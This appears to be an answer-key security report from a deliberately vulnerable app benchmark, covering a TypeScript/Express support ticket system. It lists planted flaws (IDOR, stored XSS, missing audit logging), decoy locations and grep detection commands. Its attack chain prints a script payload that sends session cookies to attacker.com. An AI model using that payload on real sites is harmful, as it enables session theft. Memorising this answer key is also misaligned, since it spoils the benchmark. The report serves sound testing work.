# Security Report: app-32-support-tickets

## Application Information

- **App ID**: app-32
- **App Name**: Support Ticket System
- **Language**: TypeScript
- **Framework**: Express
- **Source**: `apps/typescript/app-32-support-tickets/`

---

## Vulnerability Summary

| ID | OWASP | Category | Severity | Location | CWE |
|---|---|---|---|---|---|
| V1 | A01 | Broken Access Control | Medium | `src/index.ts` → `GET /api/tickets/:id` (lines 146-162) | CWE-639 |
| V2 | A03 | Injection | High | `src/index.ts` → `POST /api/tickets` (lines 163-178) | CWE-79 |
| V3 | A09 | Security Logging and Monitoring Failures | Low | `src/index.ts` → `POST /api/admin/tickets/:id/close` (lines 181-197) | CWE-778 |

### V1: IDOR on Ticket Details

**OWASP Category**: A01 — Broken Access Control

**Description**: Viewing support ticket details by ID lacks verification of user ownership, allowing any authenticated user to retrieve another customer's ticket information.

**Endpoint**: `GET /api/tickets/:id`

**CWE**: CWE-639 (Authorization Bypass Through User-Controlled Key)

**Impact**: Medium — Any authenticated user can enumerate ticket IDs to view sensitive customer support interactions and private account details.

**Detection**: Look for absence of ownership checks where the `:id` parameter is used to query tickets without verifying `req.user.id` against the ticket's customer ID.

---

### V2: Stored XSS in Ticket Creation

**OWASP Category**: A03 — Injection

**Description**: Customer ticket descriptions are stored and rendered without HTML encoding, enabling stored cross-site scripting.

**Endpoint**: `POST /api/tickets`

**CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)

**Impact**: High — An attacker can inject malicious JavaScript in a ticket description. When support agents view the ticket, the script executes in their browser, potentially stealing session tokens or performing actions on their behalf.

**Detection**: Look for ticket description fields being stored as raw HTML and served to admin/support endpoints without sanitization.

---

### V3: Missing Audit Log on Ticket Closure

**OWASP Category**: A09 — Security Logging and Monitoring Failures

**Description**: Closing support tickets at the admin level produces no audit logs, leaving state modifications untracked.

**Endpoint**: `POST /api/admin/tickets/:id/close`

**CWE**: CWE-778 (Insufficient Logging)

**Impact**: Low — Malicious closure of customer tickets cannot be traced or investigated.

**Detection**: Check the close handler for any logging, audit trail, or notification mechanism before/after performing the closure operation.

---

## Chained Attack Scenario

### Chain: "Stored XSS Ticket Hijack → IDOR Ticket Exfiltration"

**Impact**: `account_takeover`

**Overview**: An attacker creates a ticket with malicious JavaScript that steals a support agent's session, then uses that session to access other customers' tickets via IDOR.

**Components**:

| Step | Issue | Severity | OWASP | CWE | Location |
|---|---|---|---|---|---|
| 1 | Stored XSS in ticket descriptions enables session cookie theft | Medium | A03 | CWE-79 | `POST /api/tickets` |
| 2 | Ticket detail endpoint permits IDOR exfiltration of sensitive data | Medium | A01 | CWE-639 | `GET /api/tickets/:id` |

**Attack Narrative**:
1. The attacker creates a support ticket with a description containing `<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>`.
2. When a support agent views the ticket, the XSS payload executes in their browser, exfiltrating their admin session cookie.
3. Using the hijacked session, the attacker queries `GET /api/tickets/5` through IDOR to view other customers' tickets containing PII and account details.

**Combined Impact**: Account takeover — An attacker can steal support agent sessions and exfiltrate customer data by chaining stored XSS with IDOR.

---

## Decoys (False-Positive Candidates)

| Location | Description |
|---|---|
| `src/index.ts` | Proper user scoping in `GET /api/tickets` limiting results to own tickets only |
| `src/index.ts` | Proper parameterized query logic in `POST /api/tickets/:id/comments` |

---

## Detection Commands

```bash
# Find IDOR on ticket details
grep -n "tickets.*:id\|findOne\|findById" apps/typescript/app-32-support-tickets/src/index.ts

# Find XSS in ticket creation
grep -n "description\|comment\|<script\|innerHTML" apps/typescript/app-32-support-tickets/src/index.ts

# Find missing audit logs on closure
grep -n "close\|ticket\|log\|audit" apps/typescript/app-32-support-tickets/src/index.ts
```

---

*Report generated from `.vulns` manifest for app-32-support-tickets*